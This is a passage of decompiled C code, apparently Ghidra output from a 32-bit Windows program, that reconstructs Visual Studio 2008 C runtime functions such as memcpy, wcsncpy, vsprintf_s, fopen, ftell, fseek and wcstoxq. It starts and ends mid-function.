          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040a263_caseD_2;
            case 3:
              goto switchD_0040a263_caseD_3;
            }
            goto switchD_0040a263_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040a263_caseD_2;
            case 3:
              goto switchD_0040a263_caseD_3;
            }
            goto switchD_0040a263_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040a263_caseD_2;
            case 3:
              goto switchD_0040a263_caseD_3;
            }
            goto switchD_0040a263_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_0040a263_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_0040a263_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_0040a263_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_0040a263_caseD_0:
    return _Dst;
  }
  if (((0xff < _Size) && (DAT_00424fd4 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy((undefined4 *)_Dst,(undefined4 *)_Src,_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_0040a0dc_caseD_2;
      case 3:
        goto switchD_0040a0dc_caseD_3;
      }
      goto switchD_0040a0dc_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_0040a0dc_caseD_0;
    case 1:
      goto switchD_0040a0dc_caseD_1;
    case 2:
      goto switchD_0040a0dc_caseD_2;
    case 3:
      goto switchD_0040a0dc_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040a0dc_caseD_2;
          case 3:
            goto switchD_0040a0dc_caseD_3;
          }
          goto switchD_0040a0dc_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040a0dc_caseD_2;
          case 3:
            goto switchD_0040a0dc_caseD_3;
          }
          goto switchD_0040a0dc_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040a0dc_caseD_2;
          case 3:
            goto switchD_0040a0dc_caseD_3;
          }
          goto switchD_0040a0dc_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_0040a0dc_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_0040a0dc_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_0040a0dc_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_0040a0dc_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  _wcsncpy
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcsncpy(wchar_t *_Dest,wchar_t *_Source,size_t _Count)

{
  wchar_t wVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  puVar4 = (undefined4 *)_Dest;
  if (_Count != 0) {
    do {
      wVar1 = *_Source;
      *(wchar_t *)puVar4 = wVar1;
      puVar4 = (undefined4 *)((int)puVar4 + 2);
      _Source = _Source + 1;
      if (wVar1 == L'\0') break;
      _Count = _Count - 1;
    } while (_Count != 0);
    if ((_Count != 0) && (uVar2 = _Count - 1, uVar2 != 0)) {
      for (uVar3 = uVar2 >> 1; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
      for (uVar2 = (uint)((uVar2 & 1) != 0); uVar2 != 0; uVar2 = uVar2 - 1) {
        *(undefined2 *)puVar4 = 0;
        puVar4 = (undefined4 *)((int)puVar4 + 2);
      }
    }
  }
  return _Dest;
}



// Library Function - Single Match
//  __vsnprintf_helper
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vsnprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  FILE local_24;
  
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else if ((param_3 == 0) || (param_2 != (char *)0x0)) {
    local_24._cnt = 0x7fffffff;
    if (param_3 < 0x80000000) {
      local_24._cnt = param_3;
    }
    local_24._flag = 0x42;
    local_24._base = param_2;
    local_24._ptr = param_2;
    iVar2 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
    if (param_2 != (char *)0x0) {
      if (-1 < iVar2) {
        local_24._cnt = local_24._cnt - 1;
        if (-1 < local_24._cnt) {
          *local_24._ptr = '\0';
          return iVar2;
        }
        iVar3 = __flsbuf(0,&local_24);
        if (iVar3 != -1) {
          return iVar2;
        }
      }
      param_2[param_3 - 1] = '\0';
      iVar2 = (-1 < local_24._cnt) - 2;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  return iVar2;
}



// Library Function - Single Match
//  __vsprintf_s_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vsprintf_s_l(char *_DstBuf,size_t _DstSize,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (char *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if ((_DstBuf == (char *)0x0) || (_DstSize == 0)) {
      piVar1 = __errno();
      *piVar1 = 0x16;
    }
    else {
      iVar2 = __vsnprintf_helper(__output_s_l,_DstBuf,_DstSize,(int)_Format,_Locale,_ArgList);
      if (iVar2 < 0) {
        *_DstBuf = '\0';
      }
      if (iVar2 != -2) {
        return iVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



// Library Function - Single Match
//  _vsprintf_s
// 
// Library: Visual Studio 2008 Release

int __cdecl _vsprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



// Library Function - Single Match
//  _wcsrchr
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcsrchr(wchar_t *_Str,wchar_t _Ch)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  
  pwVar2 = _Str;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  do {
    pwVar2 = pwVar2 + -1;
    if (pwVar2 == _Str) break;
  } while (*pwVar2 != _Ch);
  if (*pwVar2 != _Ch) {
    pwVar2 = (wchar_t *)0x0;
  }
  return pwVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __fsopen
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __fsopen(char *_Filename,char *_Mode,int _ShFlag)

{
  int *piVar1;
  FILE *pFVar2;
  undefined local_14 [8];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00420818;
  uStack_c = 0x40a5d8;
  if (((_Filename == (char *)0x0) || (_Mode == (char *)0x0)) || (*_Mode == '\0')) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    pFVar2 = __getstream();
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      *piVar1 = 0x18;
    }
    else {
      local_8 = (undefined *)0x0;
      if (*_Filename != '\0') {
        pFVar2 = __openfile(_Filename,_Mode,_ShFlag,pFVar2);
        local_8 = (undefined *)0xfffffffe;
        FUN_0040a686();
        return pFVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x16;
      __local_unwind4(&DAT_00422040,(int)local_14,0xfffffffe);
    }
  }
  return (FILE *)0x0;
}



void FUN_0040a686(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  _fopen
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl _fopen(char *_Filename,char *_Mode)

{
  FILE *pFVar1;
  
  pFVar1 = __fsopen(_Filename,_Mode,0x40);
  return pFVar1;
}



// Library Function - Single Match
//  _strcpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strcpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  errno_t eVar4;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        cVar1 = *_Src;
        *pcVar3 = cVar1;
        _Src = _Src + 1;
        if (cVar1 == '\0') break;
        _SizeInBytes = _SizeInBytes - 1;
        pcVar3 = pcVar3 + 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        return 0;
      }
      *_Dst = '\0';
      piVar2 = __errno();
      eVar4 = 0x22;
      *piVar2 = 0x22;
      goto LAB_0040a6c9;
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_0040a6c9:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  _xtow_s@20
// 
// Library: Visual Studio 2008 Release

int _xtow_s_20(uint param_1,uint param_2,uint param_3,int param_4)

{
  short *psVar1;
  short *in_EAX;
  int *piVar2;
  short *psVar3;
  short *psVar4;
  short sVar5;
  int iVar6;
  uint local_8;
  
  if (in_EAX == (short *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return 0x16;
  }
  if (param_2 == 0) {
LAB_0040a743:
    piVar2 = __errno();
    iVar6 = 0x16;
  }
  else {
    *in_EAX = 0;
    if ((param_4 != 0) + 1 < param_2) {
      if (0x22 < param_3 - 2) goto LAB_0040a743;
      psVar3 = in_EAX;
      if (param_4 != 0) {
        param_1 = -param_1;
        *in_EAX = 0x2d;
        psVar3 = in_EAX + 1;
      }
      local_8 = (uint)(param_4 != 0);
      psVar1 = psVar3;
      do {
        psVar4 = psVar1;
        sVar5 = (short)(param_1 % param_3);
        if (param_1 % param_3 < 10) {
          sVar5 = sVar5 + 0x30;
        }
        else {
          sVar5 = sVar5 + 0x57;
        }
        *psVar4 = sVar5;
        local_8 = local_8 + 1;
      } while ((param_1 / param_3 != 0) &&
              (psVar1 = psVar4 + 1, param_1 = param_1 / param_3, local_8 < param_2));
      if (local_8 < param_2) {
        psVar4[1] = 0;
        do {
          sVar5 = *psVar4;
          *psVar4 = *psVar3;
          *psVar3 = sVar5;
          psVar4 = psVar4 + -1;
          psVar3 = psVar3 + 1;
        } while (psVar3 < psVar4);
        return 0;
      }
      *in_EAX = 0;
    }
    piVar2 = __errno();
    iVar6 = 0x22;
  }
  *piVar2 = iVar6;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return iVar6;
}



// Library Function - Single Match
//  __itow_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __itow_s(int _Val,wchar_t *_DstBuf,size_t _SizeInWords,int _Radix)

{
  int iVar1;
  
  if ((_Radix == 10) && (_Val < 0)) {
    iVar1 = 1;
    _Radix = 10;
  }
  else {
    iVar1 = 0;
  }
  iVar1 = _xtow_s_20(_Val,_SizeInWords,_Radix,iVar1);
  return iVar1;
}



// Library Function - Single Match
//  _memcpy_s
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

errno_t __cdecl _memcpy_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  errno_t eVar1;
  int *piVar2;
  
  if (_MaxCount == 0) {
LAB_0040a841:
    eVar1 = 0;
  }
  else {
    if (_Dst == (void *)0x0) {
LAB_0040a84a:
      piVar2 = __errno();
      eVar1 = 0x16;
      *piVar2 = 0x16;
    }
    else {
      if ((_Src != (void *)0x0) && (_MaxCount <= _DstSize)) {
        _memcpy(_Dst,_Src,_MaxCount);
        goto LAB_0040a841;
      }
      _memset(_Dst,0,_DstSize);
      if (_Src == (void *)0x0) goto LAB_0040a84a;
      if (_MaxCount <= _DstSize) {
        return 0x16;
      }
      piVar2 = __errno();
      eVar1 = 0x22;
      *piVar2 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return eVar1;
}



// Library Function - Single Match
//  _strrchr
// 
// Library: Visual Studio 2008 Release

char * __cdecl _strrchr(char *_Str,int _Ch)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  char *pcVar4;
  
  iVar2 = -1;
  do {
    pcVar4 = _Str;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar4 = _Str + 1;
    cVar1 = *_Str;
    _Str = pcVar4;
  } while (cVar1 != '\0');
  iVar2 = -(iVar2 + 1);
  pcVar4 = pcVar4 + -1;
  do {
    pcVar3 = pcVar4;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar3 = pcVar4 + -1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar3;
  } while ((char)_Ch != cVar1);
  pcVar3 = pcVar3 + 1;
  if (*pcVar3 != (char)_Ch) {
    pcVar3 = (char *)0x0;
  }
  return pcVar3;
}



// Library Function - Single Match
//  __ftell_nolock
// 
// Library: Visual Studio 2008 Release

long __cdecl __ftell_nolock(FILE *_File)

{
  uint uVar1;
  char *pcVar2;
  int *piVar3;
  uint _FileHandle;
  FILE *pFVar4;
  long lVar5;
  char *pcVar6;
  FILE *pFVar7;
  char *pcVar8;
  int iVar9;
  bool bVar10;
  int local_10;
  int local_c;
  
  pFVar7 = _File;
  if (_File == (FILE *)0x0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  _FileHandle = __fileno(_File);
  if (_File->_cnt < 0) {
    _File->_cnt = 0;
  }
  local_c = __lseek(_FileHandle,0,1);
  if (local_c < 0) {
    return -1;
  }
  uVar1 = _File->_flag;
  if ((uVar1 & 0x108) == 0) {
    return local_c - _File->_cnt;
  }
  pcVar6 = _File->_ptr;
  pcVar8 = _File->_base;
  local_10 = (int)pcVar6 - (int)pcVar8;
  if ((uVar1 & 3) == 0) {
    if (-1 < (char)uVar1) {
      piVar3 = __errno();
      *piVar3 = 0x16;
      return -1;
    }
  }
  else {
    pcVar2 = pcVar8;
    if ((*(byte *)((&DAT_00424fe0)[(int)_FileHandle >> 5] + 4 + (_FileHandle & 0x1f) * 0x40) & 0x80)
        != 0) {
      for (; pcVar2 < pcVar6; pcVar2 = pcVar2 + 1) {
        if (*pcVar2 == '\n') {
          local_10 = local_10 + 1;
        }
      }
    }
  }
  if (local_c != 0) {
    if ((*(byte *)&_File->_flag & 1) != 0) {
      if (_File->_cnt == 0) {
        local_10 = 0;
      }
      else {
        pFVar4 = (FILE *)(pcVar6 + (_File->_cnt - (int)pcVar8));
        iVar9 = (_FileHandle & 0x1f) * 0x40;
        if ((*(byte *)((&DAT_00424fe0)[(int)_FileHandle >> 5] + 4 + iVar9) & 0x80) != 0) {
          lVar5 = __lseek(_FileHandle,0,2);
          if (lVar5 == local_c) {
            pcVar6 = _File->_base;
            pcVar8 = pcVar6 + (int)&pFVar4->_ptr;
            _File = pFVar4;
            for (; pcVar6 < pcVar8; pcVar6 = pcVar6 + 1) {
              if (*pcVar6 == '\n') {
                _File = (FILE *)((int)&_File->_ptr + 1);
              }
            }
            bVar10 = (pFVar7->_flag & 0x2000U) == 0;
          }
          else {
            lVar5 = __lseek(_FileHandle,local_c,0);
            if (lVar5 < 0) {
              return -1;
            }
            pFVar7 = (FILE *)0x200;
            if ((((FILE *)0x200 < pFVar4) || ((_File->_flag & 8U) == 0)) ||
               ((_File->_flag & 0x400U) != 0)) {
              pFVar7 = (FILE *)_File->_bufsiz;
            }
            bVar10 = (*(byte *)((&DAT_00424fe0)[(int)_FileHandle >> 5] + 4 + iVar9) & 4) == 0;
            _File = pFVar7;
          }
          pFVar4 = _File;
          if (!bVar10) {
            pFVar4 = (FILE *)((int)&_File->_ptr + 1);
          }
        }
        _File = pFVar4;
        local_c = local_c - (int)_File;
      }
    }
    return local_10 + local_c;
  }
  return local_10;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _ftell
// 
// Library: Visual Studio 2008 Release

long __cdecl _ftell(FILE *_File)

{
  int *piVar1;
  long lVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    lVar2 = -1;
  }
  else {
    __lock_file(_File);
    lVar2 = __ftell_nolock(_File);
    FUN_0040aade();
  }
  return lVar2;
}



void FUN_0040aade(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __fseek_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fseek_nolock(FILE *_File,long _Offset,int _Origin)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  long lVar4;
  
  if ((_File->_flag & 0x83U) == 0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    iVar3 = -1;
  }
  else {
    _File->_flag = _File->_flag & 0xffffffef;
    if (_Origin == 1) {
      lVar4 = __ftell_nolock(_File);
      _Offset = _Offset + lVar4;
      _Origin = 0;
    }
    __flush(_File);
    uVar1 = _File->_flag;
    if ((char)uVar1 < '\0') {
      _File->_flag = uVar1 & 0xfffffffc;
    }
    else if ((((uVar1 & 1) != 0) && ((uVar1 & 8) != 0)) && ((uVar1 & 0x400) == 0)) {
      _File->_bufsiz = 0x200;
    }
    iVar3 = __fileno(_File);
    lVar4 = __lseek(iVar3,_Offset,_Origin);
    iVar3 = (lVar4 != -1) - 1;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fseek
// 
// Library: Visual Studio 2008 Release

int __cdecl _fseek(FILE *_File,long _Offset,int _Origin)

{
  int *piVar1;
  int iVar2;
  
  if ((_File == (FILE *)0x0) || (((_Origin != 0 && (_Origin != 1)) && (_Origin != 2)))) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else {
    __lock_file(_File);
    iVar2 = __fseek_nolock(_File,_Offset,_Origin);
    FUN_0040abed();
  }
  return iVar2;
}



void FUN_0040abed(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  unsigned __int64 __cdecl wcstoxq(struct localeinfo_struct *,wchar_t const *,wchar_t const *
// *,int,int)
// 
// Library: Visual Studio 2008 Release

__uint64 __cdecl
wcstoxq(localeinfo_struct *param_1,wchar_t *param_2,wchar_t **param_3,int param_4,int param_5)

{
  wchar_t _C;
  wchar_t *pwVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  uint extraout_ECX;
  uint uVar5;
  wchar_t *pwVar6;
  ushort uVar7;
  localeinfo_struct local_34;
  int local_2c;
  char local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  int local_18;
  undefined8 local_14;
  undefined8 local_c;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_34,param_1);
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (wchar_t *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
    goto LAB_0040aea7;
  }
  local_c = 0;
  _C = *param_2;
  pwVar1 = param_2;
  while( true ) {
    pwVar6 = pwVar1 + 1;
    iVar3 = __iswctype_l(_C,8,&local_34);
    if (iVar3 == 0) break;
    _C = *pwVar6;
    pwVar1 = pwVar6;
  }
  if (_C == L'-') {
    param_5 = param_5 | 2;
LAB_0040ac96:
    _C = *pwVar6;
    pwVar6 = pwVar1 + 2;
  }
  else if (_C == L'+') goto LAB_0040ac96;
  uVar5 = (uint)(ushort)_C;
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (wchar_t **)0x0) {
      *param_3 = param_2;
    }
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
LAB_0040aea7:
    return CONCAT44(local_c._4_4_,(uint)local_c);
  }
  if (param_4 == 0) {
    iVar3 = __wchartodigit(_C);
    if (iVar3 != 0) {
      param_4 = 10;
      goto LAB_0040ad14;
    }
    if ((*pwVar6 != L'x') && (*pwVar6 != L'X')) {
      param_4 = 8;
      goto LAB_0040ad14;
    }
    param_4 = 0x10;
  }
  if (((param_4 == 0x10) && (iVar3 = __wchartodigit(_C), iVar3 == 0)) &&
     ((*pwVar6 == L'x' || (*pwVar6 == L'X')))) {
    uVar5 = (uint)(ushort)pwVar6[1];
    pwVar6 = pwVar6 + 2;
  }
LAB_0040ad14:
  local_20 = param_4 >> 0x1f;
  local_24 = param_4;
  local_14 = __aulldvrm(0xffffffff,0xffffffff,param_4,local_20);
  local_18 = 0x10;
  local_1c = extraout_ECX;
  do {
    uVar7 = (ushort)uVar5;
    uVar4 = __wchartodigit(uVar7);
    if (uVar4 == 0xffffffff) {
      if (((uVar7 < 0x41) || (0x5a < uVar7)) && (0x19 < (ushort)(uVar7 - 0x61))) break;
      if ((ushort)(uVar7 - 0x61) < 0x1a) {
        uVar5 = uVar5 - 0x20;
      }
      uVar4 = uVar5 - 0x37;
    }
    if ((uint)param_4 <= uVar4) break;
    if (((local_c._4_4_ < local_14._4_4_) ||
        ((local_c._4_4_ <= local_14._4_4_ && ((uint)local_c < (uint)local_14)))) ||
       (((uint)local_c == (uint)local_14 &&
        ((local_c._4_4_ == local_14._4_4_ && ((local_18 != 0 || (uVar4 <= local_1c)))))))) {
